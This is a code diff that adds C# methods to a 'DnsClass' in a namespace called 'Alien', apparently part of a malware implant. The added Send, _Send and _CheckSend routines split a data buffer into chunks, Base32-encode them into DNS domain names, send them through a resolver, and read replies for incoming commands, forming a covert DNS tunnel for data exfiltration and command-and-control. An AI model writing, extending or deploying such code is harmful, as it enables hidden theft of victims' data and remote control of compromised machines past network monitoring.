@@ -63,6 +63,66 @@ namespace Alien
 			return false;
 		}
 
+		internal static MachineCommand Send()
+		{
+			MachineCommand ret = MachineCommand.Failed;
+			while (DnsClass._SendByteIndex < DnsClass._SendDataSize 
+				   && DnsClass._TryMe(() => DnsClass._Send(out ret)) 
+				   && ret == MachineCommand.Failed)
+			{
+				Util.MakeDelay(1);
+			}
+			Util.Log(string.Format("Send : {0}", ret));
+			return ret;
+		}
+
+		private static bool _Send(out MachineCommand ret)
+		{
+			int val = DnsClass._SendDataSize - DnsClass._SendByteIndex;
+			int num = Math.Min(Config.SendCount, val);
+			if (DnsClass._SendByteIndex == 0)
+			{
+				DnsClass._DomainMaker(Enums.DomainType.Send, Util.ConvertIntToDomain(DnsClass._SendByteIndex).PadLeft(3, Config.CharsDomain[0]) + Util.ConvertIntToDomain(DnsClass._SendDataSize).PadLeft(3, Config.CharsDomain[0]) + Base32Encoding.GetByteString(DnsClass._SendData.Skip(DnsClass._SendByteIndex).Take(num).ToArray<byte>()));
+			}
+			else
+			{
+				DnsClass._DomainMaker(Enums.DomainType.Send, Util.ConvertIntToDomain(DnsClass._SendByteIndex).PadLeft(3, Config.CharsDomain[0]) + Base32Encoding.GetByteString(DnsClass._SendData.Skip(DnsClass._SendByteIndex).Take(num).ToArray<byte>()));
+			}
+			ret = MachineCommand.Failed;
+			byte[] response;
+			bool flag = DnsClass._Resolver(out response);
+			if (flag)
+			{
+				if (DnsClass._InitReceive(response))
+				{
+					ret = MachineCommand.HasData;
+				}
+				if (DnsClass._CheckSend(num))
+				{
+					if (ret == MachineCommand.HasData)
+					{
+						ret = MachineCommand.DataSendedAndHasData;
+						return flag;
+					}
+					ret = MachineCommand.DataSended;
+				}
+			}
+			return flag;
+		}
+
+		private static bool _CheckSend(int sendLen)
+		{
+			DnsClass._SendByteIndex += sendLen;
+			if (DnsClass._SendByteIndex >= DnsClass._SendDataSize)
+			{
+				DnsClass._SendByteIndex = 0;
+				DnsClass._SendDataSize = 0;
+				Array.Clear(DnsClass._SendData, 0, DnsClass._SendData.Length);
+				return true;
+			}
+			return false;
+		}
+
 		private static bool _TryMe(Func<bool> fn)
 		{
 			bool result = false;
